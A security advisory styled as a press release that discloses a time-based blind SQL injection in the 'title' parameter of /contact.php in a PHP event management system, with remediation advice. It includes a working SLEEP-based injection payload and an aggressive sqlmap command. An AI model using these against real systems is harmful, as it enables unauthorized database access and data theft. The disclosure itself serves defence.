# **Press Release: SQL Injection in Event Management System (PHP) v1.0**

**Product Name**: Event Management System In PHP With Source Code  
**Affected File**: `/contact.php`  
**Discovered By**: T3rm1n4L  
**Version**: 1.0  


## **1. Executive Summary**

A critical SQL injection vulnerability has been identified in the **Event Management System In PHP With Source Code** (v1.0). Attackers can exploit the `title` parameter within `/contact.php` to inject malicious SQL code, potentially gaining full access to the underlying database. Immediate remediation is strongly advised.


## **2. Timeline of Discovery**

1. **Initial Observation**  
   - **Activity**: Security researcher T3rm1n4L noticed abnormal behavior when manipulating the `title` parameter on `/contact.php`.

2. **Technical Confirmation**  
   - **Activity**: Researcher used `sqlmap` and manual testing to confirm a time-based blind SQL injection flaw.

3. **Impact Assessment**  
   - **Activity**: Verified attackerâ€™s ability to exfiltrate sensitive data, modify records, and cause service interruptions.

4. **Disclosure**  
   - **Activity**: Vulnerability communicated to relevant stakeholders for patch development.

5. **Public Advisory Release**  
   - **Activity**: Security bulletin and public report issued to raise awareness and provide mitigation steps.


## **3. Technical Details**

- **Vulnerability Type**: SQL Injection (Time-Based Blind)
- **Parameter**: `title` (POST)
- **Proof of Concept (PoC)**:

```bash
Parameter: title (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: title=111' AND (SELECT 6044 FROM (SELECT(SLEEP(5)))Utkc) AND 'otMP'='otMP&message=1111&submit=
```

**Example sqlmap Command**:
```bash
sqlmap -u "localhost:2309/contact.php" \
       --data="title=111&message=1111&submit=" \
       --batch --level=5 --risk=3 \
       --random-agent --tamper=space2comment
```

## **4. Root Cause & Impact**

### **Root Cause**  
Insufficient user input validation of the `title` parameter allows direct injection of malicious payloads into SQL queries.

### **Potential Consequences**  
- **Unauthorized Database Access**: Attackers may read or modify protected information.  
- **Data Leakage**: Sensitive records (e.g., customer info) can be exposed.  
- **Data Tampering**: Malicious actors can create, update, or delete records.  
- **Operational Disruption**: System downtime or service interruption.


## **5. Remediation Steps**

1. **Implement Prepared Statements & Parameter Binding**  
   - Ensure separation of SQL logic and user inputs to prevent injection.

2. **Strengthen Input Validation**  
   - Enforce whitelist or strict validation on fields like `title`, rejecting suspicious characters.

3. **Apply Least Privilege**  
   - Restrict database user privileges, limiting the potential impact if a compromise occurs.

4. **Schedule Regular Security Assessments**  
   - Periodic code reviews and penetration tests to detect and address vulnerabilities promptly.
